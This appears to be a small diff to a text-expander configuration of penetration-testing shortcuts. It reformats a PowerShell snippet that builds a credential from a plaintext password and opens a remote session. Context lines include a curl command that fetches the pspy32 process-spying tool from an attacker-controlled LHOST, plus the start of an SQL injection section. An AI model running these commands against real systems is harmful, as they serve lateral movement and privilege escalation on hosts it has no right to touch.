@@ -63,7 +63,11 @@ matches:
     replace: curl -o pspy32 http://{{LHOST}}/pspy32
 
   - trigger: ":ps_remotesession"
-    replace: '$password = ConvertTo-SecureString "plaintext_password" -AsPlainText -Force\n$user = "DOMAIN\\USERNAME"\n$cred = New-Object System.Management.Automation.PSCredential($user,$password)\nEnter-PSSession -ComputerName  -Credential $cred -Authentication Negotiate'
+    replace: |
+      $password = ConvertTo-SecureString "plaintext_password" -AsPlainText -Force
+      $user = "DOMAIN\\USERNAME"
+      $cred = New-Object System.Management.Automation.PSCredential($user,$password)
+      Enter-PSSession -ComputerName  -Credential $cred -Authentication Negotiate
 
   #### SQL Injection
   - trigger: ":sqli_poly"
